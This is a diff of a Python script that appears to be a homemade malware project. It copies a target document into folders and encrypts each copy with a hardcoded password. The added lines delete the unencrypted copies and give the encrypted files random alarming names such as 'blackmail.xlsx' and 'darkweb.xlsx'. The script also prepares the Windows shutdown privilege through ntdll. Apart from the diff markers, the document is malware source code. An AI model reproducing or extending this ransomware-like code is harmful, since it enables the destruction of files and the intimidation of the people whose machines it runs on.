@@ -32,13 +32,14 @@ rootDir = 'D:\documents'
 
 fileToSearch = 'Acad Calendar_SIT JDP 2022.pdf'
 fileRenamed = 'copi.pdf'
-# fileToSearch = 'iprep.xlsx'
-# fileRenamed = 'copi.xlsx'
-encrpytedFile = 'enc.xlsx'
+# fileToSearch = 'iprep.xlsx'  # kian test doc
+# fileRenamed = 'copi.xlsx'  # kian test doc
+encNameList = ['secret.xlsx', 'darkweb.xlsx', 'db-dump.xlsx', 'blackmail.xlsx', 'target.xlsx', 'golddust.xlsx'] # list of names for the encrypted file 
+encrpytedFile = random.choice(encNameList)
 password = '31337'
 
 newPath=Path('D:\documents')
-# newPath=Path('C:\documents')
+# newPath=Path('C:\documents')  # kian test directory
 
 ntdll = ctypes.windll.ntdll
 setShutDownPriviledge = 19
@@ -104,8 +105,11 @@ def fileManip(): #manipulate file by copy and to other directory
         print(subdirectories[x])## to know which folder it goes
         dstPath=str(subdirectories[x])
         shutil.copyfile(filePath,dstPath+"\\"+fileRenamed)
-        with open(dstPath+"\\"+fileRenamed, 'rb') as inputFile, open(dstPath+"\\"+encrpytedFile, 'wb') as outputFile:    # encrypted file open as seperate file currently for testing purposes
+        openCpFile = open(dstPath+"\\"+fileRenamed, 'rb')
+        with openCpFile as inputFile, open(dstPath+"\\"+encrpytedFile, 'wb') as outputFile:    # encrypted file open as seperate file
             encrypt(inputFile, outputFile, password)
+            openCpFile.close() # close copied file before deletion
+            os.remove(dstPath+"\\"+fileRenamed) # delete unencrypted copied file
 
 
 @dataclass
